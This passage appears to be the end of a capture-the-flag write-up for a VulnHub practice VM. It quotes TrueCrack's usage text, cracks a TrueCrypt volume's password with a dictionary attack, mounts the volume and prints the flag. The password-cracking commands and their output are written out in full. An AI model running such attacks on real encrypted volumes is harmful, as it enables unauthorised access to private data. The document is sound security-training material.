-<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
-and it is optimized for Nvidia Cuda technology. It supports:</p>
-
-<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
-and Whirlpool.
-   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
-SERPENT, TWOFISH.
-   File-hosted (container) and Partition/device-hosted.
-   Hidden volumes and Backup headers.</p>
-
-<p>TrueCrack is able to perform a brute-force attack based on:</p>
-
-<p>   Dictionary: read the passwords from a file of words.
-   Alphabet: generate all passwords of given length from given alphabet.</p>
-
-<p>TrueCrack works on gpu and cpu</p></blockquote>
-
-<p>```
-truecrack
-TrueCrack v3.0
-Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
-Contact us: <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x69;&#110;&#102;&#111;&#116;&#x72;&#x75;&#x65;&#99;&#114;&#97;&#99;&#x6b;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#105;&#x6e;&#x66;&#111;&#116;&#114;&#x75;&#x65;&#x63;&#x72;&#x61;&#x63;&#x6b;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a>
-Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
-Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
-Copyright &copy; 2011 by Luca Vaccaro.</p>
-
-<p>Usage:
- truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -w &lt;wordlist_file> [-b &lt;parallel_block>]
- truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -c <charset> [-s <minlength>] -m <maxlength> [-b &lt;parallel_block>]</p>
-
-<p>Options:
- -h &mdash;help                      Display this information.
- -t &mdash;truecrypt &lt;truecrypt_file>    Truecrypt volume file.
- -k &mdash;key <ripemd160 | sha512 | whirlpool>      Key derivation function (default ripemd160).
- -b &mdash;blocksize &lt;parallel_blocks>       Number of parallel computations (board dependent).
- -w &mdash;wordlist &lt;wordlist_file>      File of words, for Dictionary attack.
- -c &mdash;charset <alphabet>        Alphabet generator, for Alphabet attack.
- -s &mdash;startlength <minlength>       Starting length of passwords, for Alphabet attack (default 1).
- -m &mdash;maxlength <maxlength>     Maximum length of passwords, for Alphabet attack.
- -r &mdash;restore <number>          Restore the computation.
- -v &mdash;verbose                   Show computation messages.</p>
-
-<p>Sample:
- Dictionary mode: truecrack &mdash;truecrypt ./volume &mdash;wordlist ./dictionary.txt
- Charset mode: truecrack &mdash;truecrypt ./volume &mdash;charset ./dictionary.txt &mdash;maxlength 10
-```</p>
-
-<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>
-
-<p><code>
-truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt
-TrueCrack v3.0
-Website: http://code.google.com/p/truecrack
-Contact us: infotruecrack@gmail.com
-Found password:     "etonacademy"
-Password length:    "12"
-Total computations: "10"
-</code></p>
-
-<p>It worked! Now all that remains is to open the volume and snoop around:</p>
-
-<p><code>
-cryptsetup open --type tcrypt dave.tc hidden
-Enter passphrase:
-mkdir -p /mnt/tcrypt
-mount /dev/mapper/hidden /mnt/tcrypt/
-root@kali:/mnt/tcrypt# ls -la
-total 20
-drwxr-xr-x 6 root root  1024 Apr 12  2016 .
-drwxr-xr-x 6 root root  4096 May  4 16:20 ..
-drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
-drwx------ 2 root root 12288 Apr 12  2016 lost+found
-drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
-drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret
-</code></p>
-
-<p>A hidden directory..with another hidden directory inside it:</p>
-
-<p><code>
-root@kali:/mnt/tcrypt/.secret# ls -la
-total 64
-drwxr-xr-x 3 root root  1024 Apr 12  2016 .
-drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
--rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
-drwxr-xr-x 2 root root  1024 Apr 12  2016 .top
-</code></p>
-
-<p>And finally, the flag!</p>
-
-<p>```
-root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt</p>
-
-<h6>#</h6>
-
-<h1><strong><em> </em></strong>  _  _  <strong><em> </em></strong>    _ <strong><strong><em> _   _ _      _ </em></strong></strong> <strong><em> </em></strong>  _  _  ___</h1>
-
-<h1>/ <strong>/ _ \| \| |/ </strong>| _ \  /<em>_   </em>| | | | |    /<em>_   </em>|<em> </em>/ _ \| \| |/ __|</h1>
-
-<h1>| (<em>| (</em>) | .<code>| (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .</code> |__ \</h1>
-
-<h1>_<strong>_</strong>/|<em>|_|___|</em>|<em>\/</em>/ __|  _<strong>/|</strong><strong>/<em>/ __| |</em></strong>_<strong>/|<em>|_||</em></strong>/</h1>
-
-<h1>#</h1>
-
-<h6>#</h6>
-
-<p>Firstly, thanks for trying this VM. If you have rooted it, well done!</p>
-
-<p>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
-goes to barrebas and junken for help in testing and final configuration.</p>
-
-<pre><code>                                                                --knightmare
-</code></pre>
-
-<p>```</p>
-
-<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ You will be awarded a medal for        \
-\ disregarding safety in saving someone. /</p>
 
 <hr />
 
